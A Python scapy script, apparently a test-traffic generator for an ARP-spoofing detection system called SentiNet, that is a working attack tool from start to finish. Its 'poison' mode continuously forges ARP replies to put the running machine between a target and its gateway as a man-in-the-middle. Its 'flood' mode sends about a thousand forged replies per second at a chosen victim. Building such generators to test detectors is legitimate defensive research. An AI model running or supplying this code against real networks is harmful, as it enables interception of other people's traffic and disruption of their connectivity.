import time
import sys
import argparse
from scapy.all import ARP, Ether, sendp, srp

def get_mac(ip):
    """
    Helper function to get MAC address for a given IP.
    (Mocked for testing purposes, but can use srp to actual discover).
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    return ans[0][1].hwsrc if ans else None

def spoof(target_ip, target_mac, spoof_ip):
    """
    Sends a forged ARP response to the target, claiming to be the spoof_ip.
    """
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def targeted_arp_poisoning(target_ip, gateway_ip):
    """
    Targeted MITM: Tell the target we are the gateway, and tell the gateway we are the target.
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[AttackGen] Could not find MAC addresses for target/gateway.")
        return

    print(f"[AttackGen] Starting targeted MITM between {target_ip} and {gateway_ip}...")
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(0.02) # ~100 packets per second to match thesis methodology
    except KeyboardInterrupt:
        print("\n[AttackGen] Stopped Targeted Poisoning.")

def arp_flooding(target_ip, gateway_ip=None):
    """
    High-volume ARP flooding (~1,000 PPS) to test Tier-1 Fast-Filter efficiency.

    Each forged reply is addressed to the victim only (never broadcast) and, when
    a gateway is given, claims to be the gateway. It used to claim the victim's
    own IP, which made other devices on the LAN relearn the victim's address as
    this machine's MAC and knocked the victim off the network through equipment
    SentiNet is not installed on. Claiming the gateway keeps the ~1,000 PPS load
    on the victim's Tier-1 filter without that side effect.
    """
    spoof_ip = gateway_ip or target_ip
    print(f"[AttackGen] Starting ARP Flooding on {target_ip} (claiming {spoof_ip})...")

    # Send to the victim's real MAC only. Falling back to broadcast would deliver
    # the forged reply to every device on the network and corrupt all their ARP
    # tables, not just the victim's.
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[AttackGen] Could not find the MAC address for {target_ip}.")
        print("[AttackGen] The victim may be offline, or a SentiNet agent there may")
        print("[AttackGen] already be blocking this machine — restart its agent to clear")
        print("[AttackGen] the blacklist, then try again.")
        return

    # ML Engine was trained on datasets where ARP Spoofing triggers a high
    # arp_reply_rate and gratuitous_arp_count. We use op=2 (Reply).
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    try:
        while True:
            sendp(packet, verbose=False)
            time.sleep(0.001) # ~1000 packets per second to match thesis methodology
    except KeyboardInterrupt:
        print("\n[AttackGen] Stopped ARP Flooding.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SentiNet Attack Generator")
    parser.add_argument("mode", choices=["poison", "flood"], help="Attack mode: 'poison' (targeted MITM) or 'flood' (high volume)")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--gateway", help="Gateway IP address (required for 'poison'; for 'flood' the address the packets claim to be — recommended)")
    
    args = parser.parse_args()
    
    if args.mode == "poison":
        if not args.gateway:
            print("Error: --gateway is required for 'poison' mode.")
            sys.exit(1)
        targeted_arp_poisoning(args.target, args.gateway)
    elif args.mode == "flood":
        if not args.gateway:
            print("[AttackGen] Note: no --gateway given, so the flood will claim the victim's")
            print("[AttackGen] own IP. Pass --gateway <ip> to claim the gateway instead and avoid")
            print("[AttackGen] disrupting the victim's connectivity through other LAN devices.")
        arp_flooding(args.target, args.gateway)
